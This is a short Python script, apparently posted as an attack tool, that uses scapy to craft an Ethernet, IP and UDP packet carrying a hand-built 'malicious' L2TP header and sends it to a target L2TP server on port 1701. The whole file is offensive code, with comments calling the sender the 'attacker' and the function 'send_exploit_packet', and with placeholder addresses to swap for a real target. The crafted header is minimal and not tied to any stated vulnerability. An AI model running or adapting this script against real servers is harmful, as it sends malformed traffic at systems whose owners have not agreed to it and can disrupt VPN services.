from scapy.all import *
# Written by Lithiokride

# Step 1: Define target parameters
target_ip = "192.0.2.1"          # Change this to the target L2TP server's IP address.
# Example: "192.168.1.1" or any public IP address of the server you are testing against.

target_mac = "00:11:22:33:44:66"  # Change this to the target MAC address (Ethernet).
# This can often be obtained through network scanning or ARP requests.

source_ip = "192.0.2.2"          # Change this to the attacker's IP address.
# Make sure this IP is within the same subnet as the target, if applicable.

source_mac = "00:11:22:33:44:55"  # Change this to the attacker's MAC address.
# This should be the MAC address of the network interface you are using to send packets.

# Step 2: Create an L2TP packet with potentially malicious values
def create_l2tp_packet():
    """
    Constructs a malicious L2TP header.
    
    Returns:
        bytes: The crafted L2TP header.
    """
    l2tp_version_and_type = bytes([0x12])  # Version (2) and Type (1).
    length_placeholder = bytes([0])          # Length placeholder (will be set later).

    # Change this to a potentially malicious Session ID
    session_id = bytes([0, 1])               # Example: Session ID set to 1. 
    # Options: Use a known session ID or a random value for testing.

    sequence_number = bytes([0, 0])          # Sequence Number (could be altered).
    # This might be set to specific values based on the attack vector.

    offset = bytes([0])                       # Offset (placeholder, usually 0).

    # Combine to form the L2TP header
    l2tp_header = (
        l2tp_version_and_type +
        length_placeholder +  # Placeholder for length
        session_id +
        sequence_number +
        offset
    )

    # Calculate the length of the L2TP header
    l2tp_length = len(l2tp_header)
    l2tp_header = l2tp_header[:1] + bytes([l2tp_length]) + l2tp_header[2:]

    return l2tp_header  # Return the crafted L2TP header.

# Step 3: Craft the complete packet
def craft_full_packet():
    """
    Combines all packet layers (Ethernet, IP, UDP, L2TP) into one packet.
    
    Returns:
        Packet: The complete crafted packet.
    """
    l2tp_packet = create_l2tp_packet()  # Call to create the L2TP packet.

    # Create Ethernet layer
    ether = Ether(src=source_mac, dst=target_mac)  # Set source and destination MAC addresses.
    # Ensure the source MAC matches the attacker's network interface.

    # Create IP layer
    ip = IP(src=source_ip, dst=target_ip)  # Set source and destination IP addresses.
    # Ensure the source IP is reachable from the target.

    # Create UDP layer (L2TP typically uses UDP port 1701)
    udp = UDP(sport=1701, dport=1701)  # Set source and destination ports.
    # Port numbers can be changed if testing specific vulnerabilities.

    # Combine all layers into one packet
    packet = ether / ip / udp / Raw(load=l2tp_packet)  # Assemble the packet.

    return packet  # Return the complete packet.

# Step 4: Send the crafted packet
def send_exploit_packet():
    """
    Sends the crafted packet to the target server.
    """
    packet = craft_full_packet()  # Call to craft the full packet.
    sendp(packet, verbose=0)      # Send the packet silently (no output to console).

# Execute the packet sending function
send_exploit_packet()  # This sends the crafted packet to the target.
print("Malicious L2TP packet sent.")  # Confirmation message for successful send.
